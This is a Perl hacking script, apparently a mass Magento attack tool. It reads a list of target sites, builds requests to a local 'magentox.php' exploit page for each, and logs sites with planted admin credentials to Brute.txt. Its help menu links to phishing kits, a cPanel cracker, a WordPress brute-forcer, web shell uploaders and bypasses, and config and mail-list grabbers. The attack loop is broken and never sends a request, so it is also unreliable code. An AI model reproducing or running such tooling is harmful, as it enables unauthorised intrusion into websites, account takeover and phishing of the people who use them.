#!/usr/bin/perl

use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;

$tnx="

                     Coded By Adam Tnx
                            ,-.
       ___,---.__          /'|`\          __,---,___
    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.
  ,'        |           ~'\     /`~           |        `.
 /      ___//              `. ,'          ,  , \___      \
|    ,-'   `-.__   _         |        ,    __,-'   `-.    |
|   /          /\_  `   .    |    ,      _/\          \   |
\  |           \ \`-.___ \   |   / ___,-'/ /           |  /
 \  \           | `._   `\\  |  //'   _,' |           /  /
  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'
     ``       /     \    ,='/ \`=.    /     \       ''
             |__   /|\_,--.,-.--,--._/|\   __|
             /  `./  \\`\ |  |  | /,//' \,'  \
            /   /     ||--+--|--+-/-|     \   \
           |   |     /'\_\_\ | /_/_/`\     |   |
            \   \__, \_     `~'     _/ .__/   /
             `-._,-'   `-._______,-'   `-._,-'
                        -Tnx help 
                      -magento Fucker
                          Enjoy ^^
 \n
";
 print color('bold red');
   print $tnx;
print colored ("This is the first version .. Wait for the new :)   ",'green'),"\n";

print color("green"),"choose number : \n1-Magento Fucker  \n2-Tnx_Help \n";
   my $whattnxwant = <STDIN>;
chomp $whattnxwant;



if($whattnxwant eq '1'){
bot();
}
if($whattnxwant eq '2'){
helper();
}


sub helper(){
print ("
  _______  _______  _______  _______ _________ _______  _______  _       _______ 
(  ____ \(  ____ )(  ___  )(       )\__   __/(  ___  )(  ___  )( \     (  ____ \
| (    \/| (    )|| (   ) || () () |   ) (   | (   ) || (   ) || (     | (    \/
| (_____ | (____)|| (___) || || || |   | |   | |   | || |   | || |     | (_____ 
(_____  )|  _____)|  ___  || |(_)| |   | |   | |   | || |   | || |     (_____  )
      ) || (      | (   ) || |   | |   | |   | |   | || |   | || |           ) |
/\____) || )      | )   ( || )   ( |   | |   | (___) || (___) || (____/Y\____) |
\_______)|/       |/     \||/     \|   )_(   (_______)(_______)(_______|_______)

prv8 letter ppl : https://ghostbin.com/paste/vb3s4m7u pwd : adamtnx
------------------------------------------------------------------------
apple scama : https://up.top4top.net/downloadf-704mhn031-zip.html
-----------------------------------------------------------------------
maillist grbber from shell : https://pastebin.com/3BDUtgPm
-----------------------------------------------------------------------
cpanel cracker : https://ghostbin.com/paste/3bv3f
          _______  _______  _       _________ _______  _______  _       _______ 
|\     /|(  ___  )(  ____ \| \    /\\__   __/(  ___  )(  ___  )( \     (  ____ \
| )   ( || (   ) || (    \/|  \  / /   ) (   | (   ) || (   ) || (     | (    \/
| (___) || (___) || |      |  (_/ /    | |   | |   | || |   | || |     | (_____ 
|  ___  ||  ___  || |      |   _ (     | |   | |   | || |   | || |     (_____  )
| (   ) || (   ) || |      |  ( \ \    | |   | |   | || |   | || |           ) |
| )   ( || )   ( || (____/\|  /  \ \   | |   | (___) || (___) || (____/Y\____) |
|/     \||/     \|(_______/|_/    \/   )_(   (_______)(_______)(_______|_______)

bot mass brute wp : https://up.top4top.net/downloadf-699i3dev1-rar.html
-------------------------------------------------------------------------
bypass shell : https://ghostbin.com/paste/kuzvt
------------------------------------------------------------------------
vhost config grabber (by fallag gassrini) : https://ghostbin.com/paste/agwyc
------------------------------------------------------------------------
wordpress shell uploader : https://up.top4top.net/downloadf-7046xo6d2-rar.html
-----------------------------------------------------------------------
               ///----------Enjoy-------///
");

}
sub bot(){
 print colored ("Coded By Adam Tnx - Run  |",'white on_red'),"\n";
print colored (" Magento Fucker <3  |",'white on_red'),"\n";
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;

print"[Magento] $site ";


$magentoxlink = "http://localhost/magentox.php";
my $exploitspymag = "$magentoxlink?url=$site&submit=submit";
if($checkksbir =~/Success /) {

    print color('bold blue');
print " -- Done\n";
    print color('reset');
    open(save, '>>Brute.txt');
    print save "++ Magento ++ $site hydra|hydra77\n";
    close(save);
    }
    print color('bold blue');
print  "- Failed \n";
    print color('reset');


        }

}